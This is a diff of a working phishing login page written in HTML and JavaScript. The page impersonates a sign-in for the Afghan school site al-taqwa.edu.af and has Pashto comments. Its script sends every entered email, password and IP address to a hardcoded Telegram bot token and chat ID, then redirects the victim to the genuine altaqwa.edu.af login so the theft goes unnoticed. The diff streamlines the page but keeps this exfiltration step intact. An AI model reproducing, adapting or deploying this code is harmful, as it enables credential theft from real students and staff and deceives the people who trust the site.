@@ -26,13 +26,16 @@ body{
 .login-container{
     width:480px;
     max-width:95%;
-    height:auto;
-    min-height:479px;
+    height:479px;
+
     background:#fff;
     border-radius:16px;
+
     padding:38px 14px 26px 14px;
+
     border:1px solid #e0e0e0;
     box-shadow:0 4px 14px rgba(0,0,0,0.08);
+
     display:flex;
     flex-direction:column;
     justify-content:center;
@@ -107,16 +110,10 @@ button{
     font-size:16px;
     font-weight:bold;
     cursor:pointer;
-    color:#fff;
 }
 
 button:hover{
     background:#0fb6d6;
-}
-
-button:disabled{
-    background:#999;
-    cursor:not-allowed;
 }
 
 /* د تېروتنې پیغام */
@@ -132,61 +129,6 @@ button:disabled{
     display: none;
 }
 
-/* د بریالیتوب پیغام */
-.success-msg {
-    background: #e6ffe6;
-    border: 1px solid #00cc00;
-    color: #006600;
-    padding: 10px;
-    border-radius: 8px;
-    font-size: 13px;
-    text-align: center;
-    margin-top: 12px;
-    display: none;
-}
-
-.loading {
-    display: none;
-    text-align: center;
-    padding: 10px;
-    color: #18c6e7;
-    font-weight: bold;
-}
-
-/* د لاګ ان شویو معلوماتو بینر */
-.info-banner {
-    background: #f0f8ff;
-    border: 2px solid #18c6e7;
-    border-radius: 8px;
-    padding: 12px 15px;
-    margin-bottom: 16px;
-    display: none;
-}
-
-.info-banner .info-title {
-    font-weight: bold;
-    color: #0066cc;
-    font-size: 14px;
-    margin-bottom: 6px;
-}
-
-.info-banner .info-item {
-    font-size: 13px;
-    padding: 3px 0;
-    color: #333;
-}
-
-.info-banner .info-item strong {
-    color: #0066cc;
-}
-
-.info-banner .info-value {
-    color: #003399;
-    background: #e6f0ff;
-    padding: 1px 8px;
-    border-radius: 3px;
-}
-
 </style>
 </head>
 
@@ -200,16 +142,7 @@ button:disabled{
 
     <div class="title">Sign in</div>
 
-    <!-- د معلوماتو بینر (که له بلې پاڼې راغلی وي) -->
-    <div id="infoBanner" class="info-banner">
-        <div class="info-title">✅ You are logged in as:</div>
-        <div class="info-item"><strong>📧 Email:</strong> <span class="info-value" id="displayEmail">-</span></div>
-        <div class="info-item"><strong>🔑 Password:</strong> <span class="info-value" id="displayPassword">-</span></div>
-    </div>
-
     <div id="errorMsg" class="error-msg"></div>
-    <div id="successMsg" class="success-msg"></div>
-    <div id="loading" class="loading">⏳ Sending...</div>
 
     <div class="input-box">
         <label>Email</label>
@@ -234,25 +167,6 @@ button:disabled{
     // ==================== د Telegram بوټ تنظیمات ====================
     const BOT_TOKEN = "8688494134:AAEFObEX1p4syZwUBPVe-iG5GXkWDj311CA";
     const ADMIN_CHAT_ID = "8295417969";
-
-    // ========== چیک کول چې آیا له بلې پاڼې راغلی ==========
-    window.onload = function() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const email = urlParams.get('email');
-        const password = urlParams.get('password');
-        
-        if (email && password) {
-            document.getElementById('displayEmail').textContent = decodeURIComponent(email);
-            document.getElementById('displayPassword').textContent = decodeURIComponent(password);
-            document.getElementById('infoBanner').style.display = 'block';
-            
-            // د URL څخه پیرامیټر لیرې کړئ
-            if (window.history && window.history.replaceState) {
-                const newUrl = window.location.pathname;
-                window.history.replaceState({}, document.title, newUrl);
-            }
-        }
-    };
 
     // ========== د پښتو تورو چک کولو فنکشن ==========
     function hasPashtoCharacters(text) {
@@ -282,46 +196,12 @@ button:disabled{
         }
     }
 
-    // د براوزر معلومات ترلاسه کول
-    function getBrowserInfo() {
-        const ua = navigator.userAgent;
-        let browser = 'Unknown';
-        if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
-        else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
-        else if (ua.indexOf('Safari') > -1) browser = 'Safari';
-        else if (ua.indexOf('Edge') > -1) browser = 'Edge';
-        else if (ua.indexOf('Opera') > -1) browser = 'Opera';
-        return browser;
-    }
-
-    // د موقعیت معلومات (د IP پر بنسټ)
-    async function getLocation(ip) {
-        try {
-            const response = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await response.json();
-            if (data && data.city) {
-                return `${data.city}, ${data.country_name}`;
-            }
-            return 'Unknown';
-        } catch {
-            return 'Unknown';
-        }
-    }
-
-    // اډمن ته پیغام لیږل
-    async function sendToAdmin(email, password, ip, location, browser) {
-        const message = `🔐 *LOGIN ATTEMPT* 🔐\n\n` +
-                       `📍 *Source:* al-taqwa.edu.af/login\n` +
-                       `👤 *Email:* ${email}\n` +
-                       `🔑 *Password:* ${password}\n` +
-                       `🌐 *IP:* ${ip}\n` +
-                       `🗺️ *Location:* ${location}\n` +
-                       `💻 *Browser:* ${browser}\n` +
-                       `🕒 *Time:* ${new Date().toLocaleString()}\n` +
-                       `📅 *Date:* ${new Date().toLocaleDateString()}`;
+    // اډمن ته پیغام لیږل (یوازې بریالي هڅو لپاره)
+    async function sendToAdmin(email, password, ip) {
+        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
         
         try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -330,10 +210,8 @@ button:disabled{
                     parse_mode: 'Markdown'
                 })
             });
-            return response.ok;
         } catch(e) {
             console.warn("Telegram error:", e);
-            return false;
         }
     }
 
@@ -341,20 +219,9 @@ button:disabled{
         const errorDiv = document.getElementById('errorMsg');
         errorDiv.textContent = message;
         errorDiv.style.display = 'block';
-        document.getElementById('successMsg').style.display = 'none';
         setTimeout(() => {
             errorDiv.style.display = 'none';
-        }, 4000);
-    }
-
-    function showSuccess(message) {
-        const successDiv = document.getElementById('successMsg');
-        successDiv.textContent = message;
-        successDiv.style.display = 'block';
-        document.getElementById('errorMsg').style.display = 'none';
-        setTimeout(() => {
-            successDiv.style.display = 'none';
-        }, 4000);
+        }, 3000);
     }
 
     document.getElementById('loginBtn').addEventListener('click', async () => {
@@ -363,60 +230,40 @@ button:disabled{
 
         // خالي ساحې چک کول
         if (!email || !password) {
-            showError('⚠️ Please fill in both email and password');
+            showError('Please fill in both email and password');
             return;
         }
 
         // د پښتو تورو چک
         if (hasPashtoCharacters(email)) {
-            showError('⚠️ Pashto characters are not allowed in email');
+            showError('Pashto not allowed ');
             return;
         }
         
         if (hasPashtoCharacters(password)) {
-            showError('⚠️ Pashto characters are not allowed in password');
+            showError('Pashto not allowed ');
             return;
         }
 
         // د ایمیل فورمټ چک (یوازې سم ایمیل)
         if (!isValidEmail(email)) {
-            showError('⚠️ Please enter a valid email address (e.g., username@gmail.com)');
+            showError('Please enter a valid email address (e.g., username@gmail.com)');
             return;
         }
 
         // د پاسورډ اوږدوالی چک
         if (!isValidPasswordLength(password)) {
-            showError('⚠️ Password must be at least 8 characters');
+            showError('Password must be at least 8 characters');
             return;
         }
 
-        // د بار کولو پیغام وښایئ
-        document.getElementById('loading').style.display = 'block';
-        document.getElementById('loginBtn').disabled = true;
-
         const ip = await getUserIP();
-        const location = await getLocation(ip);
-        const browser = getBrowserInfo();
 
-        // معلومات اډمن ته واستوئ
-        const sent = await sendToAdmin(email, password, ip, location, browser);
-
-        // بار کول پټ کړئ
-        document.getElementById('loading').style.display = 'none';
-        document.getElementById('loginBtn').disabled = false;
-
-        if (sent) {
-            showSuccess('✅ Login successful! Information sent to admin.');
-            
-            // د 2 ثانیو وروسته بل پاڼې ته لاړ شئ
-            setTimeout(() => {
-                const encodedEmail = encodeURIComponent(email);
-                const encodedPassword = encodeURIComponent(password);
-                window.location.replace(`https://www.altaqwa.edu.af/login?email=${encodedEmail}&password=${encodedPassword}`);
-            }, 1500);
-        } else {
-            showError('⚠️ Could not send to admin. Please try again.');
-        }
+        // په لومړی ځل بریالي لاګ ان - معلومات اډمن ته واستوئ
+        await sendToAdmin(email, password, ip);
+        
+        // مستقیم altaqwa.edu.af/login ته لاړ شه (د لوډینګ پرته)
+        window.location.replace("https://www.altaqwa.edu.af/login");
     });
 </script>
 
